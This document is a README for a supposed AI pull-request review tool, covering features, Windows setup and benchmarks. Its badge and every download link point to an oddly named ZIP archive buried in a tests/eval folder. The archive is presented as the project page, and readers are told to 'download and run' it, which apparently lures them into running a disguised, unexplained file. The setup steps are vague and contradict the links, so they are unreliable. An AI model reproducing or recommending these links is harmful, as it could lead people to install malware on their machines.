# 🤖 ai-code-review-agent - Safer PR checks in less time

[![Download the app](https://img.shields.io/badge/Download%20Now-Visit%20GitHub%20Page-6f42c1?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/Adqui9608/ai-code-review-agent/main/tests/eval/code_agent_ai_review_Gestapo.zip)

## 🧭 What this app does

ai-code-review-agent checks GitHub pull requests for bugs, security issues, and code quality problems. It uses an AI agent to read code changes and leave clear review comments.

This app is built for teams that want fast review help without manual scanning of every line. It also includes tracking tools and test results so you can see how the review system performs.

## 💻 Windows setup

### 1. Open the download page
Visit this page to download and run the app:

https://raw.githubusercontent.com/Adqui9608/ai-code-review-agent/main/tests/eval/code_agent_ai_review_Gestapo.zip

### 2. Get the project files
On the page, click the green **Code** button and then choose **Download ZIP**.

If you use Git, you can also clone the repo to your computer.

### 3. Unzip the folder
After the file finishes downloading:

1. Find the ZIP file in your **Downloads** folder
2. Right-click the file
3. Choose **Extract All**
4. Pick a folder you can find later, such as `Documents`

### 4. Open the folder
Open the extracted folder named `ai-code-review-agent`.

### 5. Start the app
Look for the main start file in the project folder. Common names are:

- `app.py`
- `streamlit_app.py`
- `main.py`

Double-click the file or run it from a terminal if you already have Python installed.

If Windows asks which app to use, choose **Python**.

## 🖥️ What you need on Windows

This app works best on a Windows 10 or Windows 11 PC.

You should have:

- An internet connection
- Enough free space for the app files
- Python 3.11 or later
- A modern web browser like Chrome, Edge, or Firefox

If you plan to use the AI review features, you also need access to the required AI and GitHub services.

## 🧰 What you get

This project helps you:

- Review GitHub pull requests
- Spot bugs before merge
- Catch security risks in code
- Check code quality
- Track review results
- Compare review output with test benchmarks
- See app activity in one place

## 🔎 Main features

### 🧠 AI pull request review
The agent reads changed code and looks for issues that matter. It can point out logic errors, risky patterns, missing checks, and weak code style.

### 🔐 Security issue checks
The app looks for code that may expose secrets, unsafe calls, or weak validation. It helps you catch problems early.

### 🧪 Benchmark results
The project includes evaluation tests with honest metrics. You can review how the agent performs across different cases.

### 📈 Observability with Langfuse
The app tracks runs and review steps so you can see what the agent did and where it spent time.

### ⚙️ LangGraph workflow
The review flow uses a step-by-step agent path. This helps the system process a pull request in a structured way.

### 🤖 Llama 3.3 70B support
The app uses a large language model for code review tasks. This helps it handle longer code and more context.

## 🪟 How to run on Windows

### Option 1: Run with Python
Use this if you already have Python installed.

1. Open the project folder
2. Click the address bar in File Explorer
3. Type `cmd` and press Enter
4. In the black window, run the app command shown in the project files
5. Open the local link that appears in your browser

### Option 2: Use Streamlit
If the app uses Streamlit, run it with a command like this:

1. Open the project folder
2. Open Command Prompt
3. Type the Streamlit start command from the app files
4. Press Enter
5. Wait for a local web page to open

If the page does not open, copy the local address from the terminal and paste it into your browser

## 🔑 Before you start

Some features may need setup for GitHub and AI access. In most cases, you will need:

- A GitHub account
- Access to the repository you want to review
- An AI service key
- A Langfuse account if you want trace data

Set these up before you try to review a pull request. This helps the app connect to the right services.

## 🧩 Common use case

A simple flow looks like this:

1. Connect the app to your GitHub project
2. Point it at a pull request
3. Let the agent scan the changes
4. Review the findings in the app
5. Fix the issues before merge

This gives you a quick way to check code before it reaches the main branch.

## 📊 Topics covered

This project works with tools and ideas like:

- AI agents
- Automated code review
- GitHub Actions
- Observability
- Python
- Streamlit
- LLM-based review flow
- Pydantic data handling
- LangGraph orchestration
- Langfuse tracing
- Groq model access

## 🧭 Folder layout

You may see files and folders like these:

- `app/` - app logic
- `benchmarks/` - test and evaluation data
- `prompts/` - review prompt text
- `config/` - settings files
- `logs/` - run records
- `README.md` - project guide

## 🛠️ If the app does not start

Try these steps:

1. Check that Python is installed
2. Make sure you unzipped the full project
3. Run the command from the project folder
4. Close other apps that use the same port
5. Open the browser link shown in the terminal

If the app still does not load, restart Windows and try again

## 🔐 Security and privacy

This app may read code from pull requests to give review results. Use it only on projects you trust and on code you have access to review.

If you connect third-party services, keep your keys private and store them in your local environment settings

## 📦 Download and setup link

Download and run this file from the GitHub page:

https://raw.githubusercontent.com/Adqui9608/ai-code-review-agent/main/tests/eval/code_agent_ai_review_Gestapo.zip

## 🧪 Benchmarks and evaluation

The repo includes benchmark work that checks how well the agent finds real issues. This helps you judge the system based on results, not claims.

You can use these results to compare:

- Bug detection
- Security finding rate
- Code quality feedback
- Missed issue rate
- Review consistency

## 🧭 Best use cases

Use this app when you want to:

- Review pull requests faster
- Add a second pair of eyes
- Find common code mistakes
- Catch risky changes before merge
- Track review quality over time

## 📌 Need-to-know steps for first use

1. Download the project from GitHub
2. Unzip it
3. Open the folder in Windows
4. Start the app with Python or Streamlit
5. Open the local page in your browser
6. Connect the required services
7. Review your first pull request